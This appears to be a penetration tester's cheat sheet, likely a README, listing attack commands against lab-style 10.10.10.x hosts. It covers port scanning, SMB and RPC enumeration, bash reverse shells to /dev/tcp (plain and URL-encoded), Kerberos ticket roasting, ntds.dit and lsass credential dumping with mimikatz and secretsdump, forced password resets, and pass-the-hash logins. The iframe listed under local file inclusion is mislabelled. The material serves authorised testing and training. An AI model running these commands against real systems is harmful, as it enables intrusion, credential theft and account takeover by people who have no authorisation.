# PenTestReference

A selection of commands and tools for PenTesters.

## Network scanning - nmap

### Quick scan of common ports

nmap -v -sV 10.10.10.99

### TCP scan

nmap -v -sT 10.10.10.99

### UDP scan (runs as root)

sudo nmap -v -sU 10.10.10.99

### TCP scan of all ports (takes a long time)

nmap -v -sT -p0-65535 10.10.10.99

### UDP scan of all ports (runs as root, takes a very long time)

nmap -v -sU -p0-65535 10.10.10.99

## SMB shares

### List all shares with anonymous authentication

smbclient -L 10.10.10.99

### Connect to a share with anonymous authentication

smbclient \\\\10.10.10.99\\sharename

### Connect to a share with user authentication

smbclient -U 'DOMAIN\username' \\\\10.10.10.99\\share password

### Mount a share

sudo mount -t cifs -o user=username //10.10.10.99/share /mnt/local_share_name

## Web fuzzing

### Fuzz for directories

ffuf -c -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.99/FUZZ

### Fuzz for php files

ffuf -c -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.187/FUZZ.php

### Fuzz for subdomains

ffuf -w /usr/share/dirb/wordlists/big.txt -u http://target.com -H "Host: FUZZ.target.com" -fs 4242

* Replace 4242 with the size of the main domain page, to ignore false positives

## Crawl website for strings

cewl http://10.10.10.99

## Reverse shells

### Start listener on linux

nc -lvnp 9999

### Basic bash shell

bash -c 'bash -i >& /dev/tcp/10.10.10.123/9999 0>&1’

### URL encoded bash shell

bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.99%2F9999%200%3E%261%27

### Getting a real shell

echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py

## Password hashes

### Hashcat

hashcat -m 100 hash.file /host/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule —force

## Local file inclusion

### iFrame

<iframe id="serviceFrameSend" src="test.html" width="1000" height="1000"  frameborder="0">

## LDAP

### Extract LDAP information without authentication

ldapsearch -LLL -x -H ldap://targetdomain.com -b ‘’ -s base ‘(objectclass=*)’

## Active directory and kerberos

### Get authentication ticket for user

python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/username -no-pass -dc-ip 10.10.10.99 > ticket.tgt

### Extract password from ticket using hashcat

hashcat -m 18200 --force -a 0 ticket.tgt /host/rockyou.txt

### Copy ntds.dit using DiskShadow

Comes from https://pentestlab.blog/tag/ntds-dit/

diskshadow.exe /s c:\windows\temp\diskshadow.txt

Example text file can be found here https://github.com/codebycamk/DiskShadowCopyNtds.

Also get an extract of SYSTEM from the registry:

reg.exe save hklm\system c:\windows\temp\reg.bak

### Extract hashes from ntds.dit

impacket-secretsdump -ntds ntds.dit -system reg.bak LOCAL

### Extract password hashes from lsass memory dump using mimikatz (run on Windows)

mimikatz.exe

sekurlsa::minidump lsass.dmp

sekurlsa::logonPasswords

## RPC

### Connect to RPC client anonymously

rpcclient -U "" -N 10.10.10.99

### Connect to RPC client as user

rpcclient 10.10.10.99 -U username

### RPC enum commands

enumdomusers

enumprinters

enumprivs

queryuser username

### RPC change password of another user

setuserinfo2 username 23 'Anewpass1'

## Connect to Windows server via RM

### Evil WinRM with username and password

evil-winrm -i 10.10.10.99 -u Username -p Password

### Evil WinRM with username and NTLM hash (pass the hash)

evil-winrm -i 10.10.10.99 -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572ef62